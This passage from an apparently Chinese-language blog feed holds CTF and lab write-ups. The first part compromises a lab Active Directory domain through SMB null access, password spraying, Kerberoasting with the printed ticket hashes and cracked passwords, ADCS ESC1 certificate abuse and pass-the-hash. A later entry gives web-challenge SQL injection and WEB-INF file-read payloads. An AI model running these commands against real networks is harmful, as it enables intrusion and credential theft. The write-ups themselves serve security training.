172.22.9.47:21 ftp Aa12345. 530 Login incorrect.</span><br></pre></td></tr></table></figure><ul><li>172.22.9.7 XIAORANG\XIAORANG-DC</li><li>172.22.9.19 æ‹¿ä¸‹äº†</li><li>172.22.9.26 DESKTOP-CBKTVMO.xiaorang.lab</li><li>172.22.9.47 fileserver</li></ul><p>ç„¶åè¿™é‡Œ47çš„æœºå­æ˜¯ä¸ªæ–‡ä»¶æœåŠ¡å™¨ï¼Œå¯èƒ½å¼€äº†<strong>SMB Clientï¼ˆå®¢æˆ·ç«¯ï¼‰ï¼š</strong> åƒæ˜¯è¿›åº—çš„<strong>é¡¾å®¢</strong>ã€‚å®ƒæ˜¯ç”¨æ¥è¿æ¥ã€æŸ¥çœ‹å¹¶æ“ä½œè¿œç¨‹å…±äº«èµ„æºçš„<strong>å·¥å…·æˆ–ç»„ä»¶</strong>ã€‚</p><p>äºæ˜¯æˆ‘ä»¬æ— å¯†ç è¿æ¥ä¸€ä¸‹ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbclient 172.22.9.47 -no-pass</span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨å¯¹åº”çš„å‘½ä»¤å‘ç°äº†ç¬¬äºŒä¸ªflagå’Œä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶</p><p><img src="/../images/achieve/2026/1/image-20260219010436734.png" alt="image-20260219010436734"></p><p>å¹¶ä¸”æç¤ºäº†spnï¼šç®€å•æ¥è¯´ï¼ŒSPN æ˜¯<strong>æœåŠ¡åœ¨åŸŸå†…çš„â€œèº«ä»½è¯å·â€</strong>ã€‚</p><h2 id="flag3-flag4"><a href="#flag3-flag4" class="headerlink" title="flag3&amp;flag4"></a>flag3&amp;flag4</h2><p>è¿™é‡Œæˆ‘ä»¬çœ‹è¿™ä¸ªæ•°æ®åº“ï¼Œå‘ç°æœ‰è´¦å¯†ï¼Œå¯†ç å–·æ´’çœ‹çœ‹èƒ½ç™»å½•å“ªå°æœºå™¨å‘—ï¼</p><p><img src="/../images/achieve/2026/1/image-20260219011122478.png" alt="image-20260219011122478"></p><p>è¿™ä¸ªdbæ–‡ä»¶å¯ä»¥ç›´æ¥åœ¨kaliæ‰“å¼€ä¹Ÿå¯ä»¥æ”¾åˆ°navicaté‡Œé¢ï¼Œä¸»è¦æ˜¯ä¸ºäº†æ–¹ä¾¿å¯¼å‡ºï¼Œå¯¼å‡ºä¹‹åè¦å¤„ç†ä¸€ä¸‹æ–‡ä»¶æ ¼å¼ï¼Œè¿™ä¸ªé—®aiå°±å¥½äº†</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 netexec rdp 172.22.9.26 -u usernames.txt -p passwords.txt --continue-on-success &gt; rdp<span class="built_in">_</span>results.txt 2&gt;<span class="built_in">&amp;</span>1</span><br><span class="line"></span><br><span class="line">xiaorang.lab<span class="keyword">\liupeng</span>:fiAzGwEMgTY</span><br><span class="line">xiaorang.lab<span class="keyword">\zhangjian</span>:i9XDE02pLVf</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸¤ä¼¼ä¹æ²¡æƒé™rdpï¼Œä½†æ˜¯å¯†ç éƒ½åœ¨è¿™äº†æˆ‘ä»¬å¯ä»¥å»è¯·æ±‚STç¥¨æ®ï¼Œæ‰“Kerberoasting</p><blockquote><p>ç®€å•æ¥è¯´ï¼ŒKerberoasting æ˜¯ä¸€ç§ä¸“é—¨é’ˆå¯¹ Windows åŸŸç¯å¢ƒçš„ç¦»çº¿å¯†ç æ”»å‡»æŠ€æœ¯ã€‚<br>å®ƒçš„æ ¸å¿ƒé€»è¾‘éå¸¸â€œæµæ°“â€ï¼šä»»ä½•ä¸€ä¸ªåˆæ³•çš„åŸŸç”¨æˆ·ï¼Œéƒ½å¯ä»¥å‘åŸŸæ§è¯·æ±‚ä»»æ„æœåŠ¡çš„ç¥¨æ®ï¼Œå¹¶å°è¯•åœ¨è‡ªå·±çš„ç”µè„‘ä¸Šæš´åŠ›ç ´è§£è¿™äº›ç¥¨æ®ï¼Œä»è€Œè¿˜åŸå‡ºæœåŠ¡è´¦å·çš„æ˜æ–‡å¯†ç ã€‚</p></blockquote><p>å› ä¸ºSTç¥¨æ®æ˜¯è¯·æ±‚çš„æœåŠ¡å™¨çš„æœåŠ¡è´¦å·hashåŠ å¯†çš„ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥å°è¯•å»ç ´è§£è¿™ä¸ªhashï¼Œè¿™é‡Œä¸å°±å’Œå‰é¢çš„spnè”ç³»èµ·æ¥äº†å—</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2026/1/image-20260219011943367.png" alt="image-20260219011943367"></p><p>å¾—åˆ°ä¸¤ä¸²hash</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">$</span>krb5tgs<span class="built_in">$</span>23<span class="built_in">$</span>*zhangxia<span class="built_in">$</span>XIAORANG.LAB<span class="built_in">$</span>xiaorang.lab/zhangxia*<span class="built_in">$</span>2c381ee85ea38fba57f0b13d8bec4792<span class="built_in">$</span>36ec4c8a84f332190a45b83d18aeb8389f138095424ace3d6b01b55355758bfb05297ac278c7141fb93655e743323c7ecf0bde480c0a5be41fbc86f21619af15f6b5a8eca85e8837566b966546e711c15f6cd8455462a1869c0ce1e4e202b623a2f32a644609208e1ea884df08f4e6acfbc204d99a56e5fb4e97a712e22d8697fc40d954926fd748640557deb840e882c4d51a5f32f65ccfbbc7e5965967ff36eb4428cd8fa2170c3c3f562ee2d295d209839e9b5dca904364bd8fbf926dbbf6553a89b9526f9b59f04033f6f5f9ba8d57bdbd323678f76791351181782cf032458ae6149566f0a181c6d5baf5f07a8868ac7318a560536c6570c8b5e2f76ee91f4ed8ef6c1cd1933f7b73b0fe28ce00f54350cad7cfb44691ae87f795f2bc324b599d8bd07ab77c8582cbe3943935f01daa6bbfa70911cc62c272f8376c131e6d884d2de4fe2e5406c528d762e4f7e9fbcc2cdc67485eb503ae68496e2f7fcfe7d4c1c7644b5530960f1551211f5092bf0489fbbdac052d86a6090da290816fba814779ffb55c86a5350264a9d06a974bccff4e1644ff28c20fb8d8cf171b555b1dbb4bccf49fe9f1404ed468818e718fae0192e298251c05e971a378179311fe4b64e6b4bab5634f2dbdb988841b7e73a58e5d4c0c06d3fe7b934c108a8f4f998657129de1207550b758060ba153bea5beb12fcabda755e2d1476cbe6b134cf5b8ed21dae1ad29c212b1a3eb04684c262eefd0105fa7a089416352fa92ae3036a21953b612157c425b325a3aa517e5aaace6082b1eae636a2c9ece677442af4139f52823f0fcb407998b43050c2b960122b17b872cae2c0e35114757d35c30af3485e2ce2ee94068f38aa4f00ec84b1955ae1c406fa5d8eb3353cb3c22f9921017b17dd55308e740ef832f2128c6de1486093cd8dc78ff8d8de360abea179fa5e5ddd17c2795e56f1236c426ed07b4c4e68f3f08999da95cacd7b1d109f7ebf01b2425b458286e22a6a15b2a39be0df801a7ff75527e665772e89404ce39779051c22601c346e31a5f3af465b2d965f04ccc3d276e8bb623bd985fb8d40bca206da38dcba4e5dad760d4a257b9e6da74dc868c61732063e31e8b5a6e33bb546df0991f8829c08fa0b8c9720151be5a0d2feaecfa10d6c2d6f0144698118824885c40f230d3b61c72449fdc745893046a022f0db19146964107af91917819bbce2ba9325ba8dead142e85b89e3883fd7197d3b563021989b134648e9de36eb9bfd34126f23061d2cd4077d400b7e436d0924dc981b72ef43c103d25cacb488ccf95ec1cb2cdac706f245248e985938d603806ef49dfe92262f9694f5f2a6890df3b96da19d4dc77e852563baaf52cc2ef1e4461af70288cae8df3c3fccb15eaf47cdde2a37271dbcaeac9de5fc1eb2337a813d1ee5f8b9a7959f0412d03b16f70420438e623a4dbef7fd6bb4a974e7b7a39f6a4eb1d2f6f84b57508790659e239f8bd69e99f1540dbcdf568a473</span><br><span class="line"><span class="built_in">$</span>krb5tgs<span class="built_in">$</span>23<span class="built_in">$</span>*chenchen<span class="built_in">$</span>XIAORANG.LAB<span class="built_in">$</span>xiaorang.lab/chenchen*<span class="built_in">$</span>4cbb191420cba9216660335c0a767204<span class="built_in">$</span>ed581dff63d30b0b9d77c3a54d0dff0ff4ec76edc43b45dc3d575269fe8efeb9199c98cb8fb1e3f1639dd403e6ccd790b1a5325ebb279c75089b4bea3f381f6661e8b3d3bca1008786e6af5eb230b3eb534dafa8d7ab58a30b0bcfd2a7b6e3f1fc227ec88e09f57e57d16e11167cfbe14295df98eb31353554a4008ac0ca2b176d2feab9a1d3a834ab1fd8cf8a520b893c6bbb5f1b840d231ae3d7a0c46b106115317b9b2f706b7678860726e08f65b020d4ed66f5ab120f42a9a113dcd0495925c0f52a51d10d1acc975bda9cbd252fd4a48d1f9619cdfffa1eee5fdae164c65364b50f37790f3f49f011689f568940cab29bfe231068980c341fcd65e927752a9176d6cca847fd201f13c86cda3a3e14b37fdb4d29d6dacec8302d4800c226fd5bd75f9b8640bd837167bed3266cb09debc1d53f0896c78a0610f651a2cd8cc9c356d7342fb81b540642209a9d64776deb0fdd810cad7799f6c6ab661bfbad4fc0f69e78f0da86504947b94b57c05769f930a7db923ee5c750020dcdeb986add29748fb506eb7600809457a947a7aad74c540a91cc305966d0f393c0596aa3985a5d9b41f5509f456ff71bc7b948ed5b140f4e240cae4c5be2f310747bc0b7c88ea69e5c3b23927f4944e7236814b50d96096e82644257b36e56ade710b19da5b5fa8fdda507ee1e2a3f8d28546ca300860f685fbada366c26c8ac7f8e9a2a0656c67977edd58566e9522fc1cd09e688b5bae3a768119e0a2426893bd045d53222737704a9d963f79d1eab96a8bb6a660599a1566f952ce4fef225dd242589434ee5989f593c1997a98585f98f9a68fa731e59eb1ff9b9d0cec51a9be0d4a529901ef2b3cfb6913eb4c73da0d17d5ff39252efb421fc76f0854607dbba25e9a4514775fb6c818f4c6fe9ac0a4a698da6e801194888ba1c24304b6714d24c01417c02837a8793ff3ea7420fd4da55e9063c6c254a160e1f504e3246bc767ee5ab6a257b8b202d7214b1db972e888936e24b2fba5c8609733080cb250ffb5186523a583d6803ece9970cce16d7714197d367d8d057998043de7533f59b8c106c16772549fd9fb87fd9443b5b25be7923cd480c3f29b74a62251cda90ac80f04f502e4510e53f9639d8bc303e48de54e6c000a658e0af4c2509252d51e760ad757590605291be7e63f0e635de96a181c6e73a7ae352e384092411946106b939d0d84bb1b175da4889507b24d744445b3c463a17b6a4e93f3d0c0df82c198ed19dc3e12de8b5d9970fe40d71ac29ffbf0d41feff600f2c599b199e5e3323f3aeb3bf286c1fd6bb53ca761e1323ab48cfc3d7b8a4c103bdd7a35f60687f88ccd5a53fb45745508449004165990abc5934a0d0ab90ba72a37894a2b07ae5388aa5b127f88f47303b0749906f43bf768350686b4039807e9699d03c117c88cc34f303347ccd9bbe33b48525cbdeaa3276514ebd2afed797dec40cb4eea2c286068a6e48939c8f841de72edc4ecc0671c1</span><br></pre></td></tr></table></figure><p>ç ´è§£å³å¯hashç±»å‹ä¸º13100</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 1 rockyou.txt --force</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XIAORANG.LAB<span class="keyword">\zhangxia</span></span><br><span class="line">MyPass2@@6</span><br><span class="line"></span><br><span class="line">XIAORANG.LAB<span class="keyword">\chenchen</span></span><br><span class="line">@Passw0rd@</span><br></pre></td></tr></table></figure><p>æ²¡æƒ³åˆ°è¿™ä¸¤å°±æ˜¯æœåŠ¡è´¦å·ï¼Œæ‰€ä»¥ç›´æ¥åˆ©ç”¨è¿™ä¸ªrdpæˆåŠŸäº†ï¼Œä½†æ˜¯æ²¡æƒé™è¯»ä¸äº†flagï¼Œäºæ˜¯å…ˆç”¨sharphoundä¿¡æ¯æ”¶é›†å§ï¼Œæˆ‘è¿™é‡Œé‡åˆ°äº†é—®é¢˜æˆ‘ç”¨çš„éƒ½æ˜¯æ—§ç‰ˆçš„ï¼Œæ‰€ä»¥è¿™é‡Œå€Ÿç”¨baoå¸ˆå‚…çš„å›¾</p><p><img src="/../images/achieve/2026/1/image-20260219164251158.png" alt="image-20260219164251158"></p><p>è¿™é‡Œå¾ˆæ˜æ˜¾å°±æ˜¯æ‰“ADCS ESC1è¿™ä¸ªæ¼æ´</p><blockquote><p>è¯¥æ¼æ´æºäºä¸å½“é…ç½®çš„è¯ä¹¦æ¨¡æ¿ï¼Œå…è®¸ä»»ä½•ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼ˆæœ‰æ“ä½œ ADCSESC1 æ¼æ´çš„æƒé™ï¼‰ä¸ºå…¶ä»–ç”¨æˆ·ï¼ˆåŒ…æ‹¬åŸŸç®¡ç†å‘˜ï¼‰ç”³è¯·è¯ä¹¦ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´é€šè¿‡åˆ›å»ºç‰¹å®šçš„è¯ä¹¦æ¥è·å–TGTï¼Œä»è€Œå®ç°æƒé™æå‡ã€‚åˆ©ç”¨è¿‡ç¨‹åŒ…æ‹¬æ£€æµ‹æ¼æ´å­˜åœ¨æ€§ã€åˆ›å»ºè¯ä¹¦ã€è½¬æ¢æ ¼å¼ä»¥åŠä½¿ç”¨Rubeusç­‰å·¥å…·è¯·æ±‚TGTå’Œæ‰§è¡ŒDCSyncæ“ä½œã€‚</p></blockquote><p>æ ¸å¿ƒé€»è¾‘å°±æ˜¯åˆ©ç”¨é…ç½®ä¸å½“çš„æ¨¡æ¿ï¼Œâ€œåˆæƒ…åˆç†â€åœ°é€šè¿‡ AD CS ç”³è¯·å‡ºä¸€å¼ å±äºâ€œåŸŸç®¡ç†å‘˜â€çš„èº«ä»½è¯ï¼ˆè¯ä¹¦ï¼‰ã€‚ç„¶åå†å»è¯·æ±‚TGTç¥¨æ®ï¼Œé€šå¸¸æˆ‘ä»¬é€šè¿‡ AS-REQ è¯·æ±‚ TGT æ—¶éœ€è¦ç”¨æˆ· Hashã€‚ä½†å½“å¼•å…¥ ADCS è¯ä¹¦æœåŠ¡åï¼ŒWindows æ”¯æŒä¸€ç§åä¸º PKINITï¼ŒPKINIT æ˜¯ Kerberos åè®®çš„ä¸€ä¸ªæ‰©å±•ï¼Œå®ƒå…è®¸ç”¨æˆ·ä½¿ç”¨æ•°å­—è¯ä¹¦ï¼ˆå…¬ç§é’¥å¯¹ï¼‰è€Œä¸æ˜¯å¯¹ç§°å¯†é’¥ï¼ˆå¯†ç  Hashï¼‰æ¥è¿›è¡Œåˆå§‹èº«ä»½éªŒè¯ï¼ˆPre-Authenticationï¼‰</p><p>æ”»å‡»æ­¥éª¤ï¼š</p><ol><li><p>æŸ¥çœ‹è¯ä¹¦æ¨¡æ¿ï¼šproxychains4 -q certipy-ad find -u â€˜<a href="mailto:&#122;&#x68;&#97;&#110;&#x67;&#x78;&#105;&#97;&#x40;&#120;&#105;&#x61;&#111;&#x72;&#x61;&#110;&#x67;&#46;&#108;&#97;&#x62;">&#122;&#x68;&#97;&#110;&#x67;&#x78;&#105;&#97;&#x40;&#120;&#105;&#x61;&#111;&#x72;&#x61;&#110;&#x67;&#46;&#108;&#97;&#x62;</a>â€˜  -password â€˜MyPass2@@6â€™ -dc-ip 172.22.9.7 -vulnerable -stdout</p></li><li><p>è¯·æ±‚åŸŸç®¡è¯ä¹¦ï¼šproxychains certipy-ad req -u â€˜<a href="mailto:&#x7a;&#104;&#x61;&#x6e;&#x67;&#120;&#105;&#x61;&#64;&#120;&#105;&#97;&#x6f;&#114;&#x61;&#x6e;&#103;&#46;&#x6c;&#97;&#98;">&#x7a;&#104;&#x61;&#x6e;&#x67;&#120;&#105;&#x61;&#64;&#120;&#105;&#97;&#x6f;&#114;&#x61;&#x6e;&#103;&#46;&#x6c;&#97;&#98;</a>â€˜ -p â€˜MyPass2@@6â€™ -target 172.22.9.7 -dc-ip 172.22.9.7 -ca â€˜xiaorang-XIAORANG-DC-CAâ€™ -template â€˜XR Managerâ€™ -upn â€˜<a href="mailto:&#x61;&#x64;&#x6d;&#105;&#110;&#x69;&#115;&#x74;&#114;&#x61;&#x74;&#x6f;&#x72;&#64;&#120;&#x69;&#x61;&#111;&#x72;&#x61;&#x6e;&#103;&#x2e;&#x6c;&#x61;&#x62;">&#x61;&#x64;&#x6d;&#105;&#110;&#x69;&#115;&#x74;&#114;&#x61;&#x74;&#x6f;&#x72;&#64;&#120;&#x69;&#x61;&#111;&#x72;&#x61;&#x6e;&#103;&#x2e;&#x6c;&#x61;&#x62;</a>â€˜</p></li><li><p>è¯·æ±‚TGTï¼šproxychains certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7</p></li></ol><p><img src="/../images/achieve/2026/1/image-20260219165940020.png" alt="image-20260219165940020"></p><p>è¿™é‡Œå°±å¯ä»¥è¿”å›ç®¡ç†å‘˜çš„hashï¼Œäºæ˜¯æˆ‘ä»¬ç›´æ¥PTHå³å¯</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 Administrator@172.22.9.7 -codec gbk</span><br><span class="line"></span><br><span class="line">proxychains4 impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 xiaorang.lab/Administrator@172.22.9.26 -codec gbk</span><br><span class="line"></span><br><span class="line">cd Users<span class="keyword">\Administrator</span><span class="keyword">\flag</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> log4j2 </tag>
            
            <tag> SMBåè®® </tag>
            
            <tag> å¯†ç å–·æ´’ </tag>
            
            <tag> Kerberoasting </tag>
            
            <tag> ADCS ESC1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>something-about-buuctf</title>
      <link href="/2026/02/03/something-about-buuctf/"/>
      <url>/2026/02/03/something-about-buuctf/</url>
      
        <content type="html"><![CDATA[<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p><img src="/../images/achieve/2026/1/image-20260203210525674.png" alt="image-20260203210525674"></p><p>ä¸€ä¸ªç™»å½•æ¡†ç›´æ¥å¼€æï¼Œä¸‡èƒ½å¯†ç è¯•äº†ä¸è¡Œï¼Œå·²ç»è¯´äº†æ˜¯sqlå°±æ²¡ç€æ€¥å»è€ƒè™‘å¼±å£ä»¤ä»€ä¹ˆçš„ï¼sqlmapæµ‹å‡ºæ—¶é—´ç›²æ³¨ï¼Œç›´æ¥æ¢­å“ˆï¼Œä½†æ˜¯å¤ªä¹…äº†ï¼Œè€Œä¸”å¯†ç è²Œä¼¼è¿˜æ˜¯md5åŠ å¯†çš„ï¼Œæ‰€ä»¥è„±åº“çš„ä»·å€¼ä¸å¤§ï¼Œå› ä¸ºè²Œä¼¼é‡Œé¢æ²¡æœ‰flagï¼Œå¯èƒ½å°±æ˜¯è¦è®©æˆ‘ä»¬ç™»å½•ç»™flag</p><p><img src="/../images/achieve/2026/1/sqlmap.png" alt="image-20260203211346005"></p><p>cmd5åœ¨çº¿ç¢°æ’å¤±è´¥ã€‚ã€‚ã€‚ã€‚</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = &#x27;<span class="built_in">$</span>name&#x27;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œé‚£è¿™ä¸ªsqlæ‰§è¡Œçš„ç»“æœé‡Œé¢çš„å¯†ç æ¥è¿›è¡Œæ¯”å¯¹ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡unionå»æ§åˆ¶è¿”å›çš„ç»“æœï¼Œåªä¸è¿‡ç»“æœä¸ä¼šå›æ˜¾åˆ°é¡µé¢</p><p><img src="/../images/achieve/2026/1/image-20260203211346005.png" alt="image-20260203211346005"></p><p>è¿™é‡Œåªè¦æŸ¥è¯¢ç»“æœé‡Œé¢çš„ç”¨æˆ·åæ˜¯adminå°±ä¼šå»æ¯”å¯¹å¯†ç ï¼ŒæŒ‰ç…§æƒ¯ä¾‹ç¬¬3åˆ—å°±æ˜¯å¯†ç äº†ï¼Œäºæ˜¯æˆ‘ä»¬åˆ©ç”¨æ•°ç»„çš„md5è¿”å›nullè¿›è¡Œç™»å½•</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,&#x27;admin&#x27;,null<span class="params">#</span><span class="built_in">&amp;</span>pw[]=1</span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>javaæ¥å’¯ï¼</p><p><img src="/../images/achieve/2026/1/image-20260204130804179.png" alt="image-20260204130804179"></p><p>helpè¿™ä¸ªé“¾æ¥è€ƒè™‘æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œä½†æ˜¯è¦æ”¹æˆpostè¯·æ±‚ï¼Œè€Œä¸”å¾—bpå»å‘åŒ…ï¼Œåæ­£æˆ‘ç”¨hackbarä¸è¡Œï¼</p><blockquote><p><strong>WEB-INF</strong> æ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚</p><p> WEB-INFä¸»è¦åŒ…å«ä»¥ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š<br>&#x2F;WEB-INF&#x2F;web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚<br>&#x2F;WEB-INF&#x2F;classes&#x2F;ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­<br>&#x2F;WEB-INF&#x2F;lib&#x2F;ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶<br>&#x2F;WEB-INF&#x2F;src&#x2F;ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚<br>&#x2F;WEB-INF&#x2F;database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶</p></blockquote><p>ç›´æ¥å»è¯»&#x2F;WEB-INF&#x2F;web.xmlï¼Œå› ä¸ºè¿™é‡Œé¢å®šä¹‰äº†æ˜ å°„å…³ç³»</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app<span class="built_in">_</span>4<span class="built_in">_</span>0.xsd&quot;</span><br><span class="line">         version=&quot;4.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;welcome-file-list&gt;</span><br><span class="line">        &lt;welcome-file&gt;Index&lt;/welcome-file&gt;</span><br><span class="line">    &lt;/welcome-file-list&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.wm.ctf.IndexController&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/Index&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.wm.ctf.LoginController&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/Login&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.wm.ctf.DownloadController&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/Download&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°&#x2F;Flagè¿™ä¸ªç›®å½•å¯¹åº”çš„æ˜¯com.wm.ctf.FlagController.classæ–‡ä»¶ï¼Œäºæ˜¯æˆ‘ä»¬å†é€šè¿‡&#x2F;WEB-INF&#x2F;classes&#x2F;è¿™ä¸ªå»è¯»</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure><p>æ¥ç€åç¼–è¯‘å³å¯</p><p><img src="/../images/achieve/2026/1/image-20260204133321326.png" alt="image-20260204133321326"></p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>è¿™é¢˜å¾ˆæ˜ç¡®å°±æ˜¯sqlæ³¨å…¥ï¼Œè€Œä¸”æœ‰è¿‡æ»¤æç¤ºçš„sqlæ³¨å…¥ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥æ¥fuzz</p><p><img src="/../images/achieve/2026/1/image-20260205133817457.png" 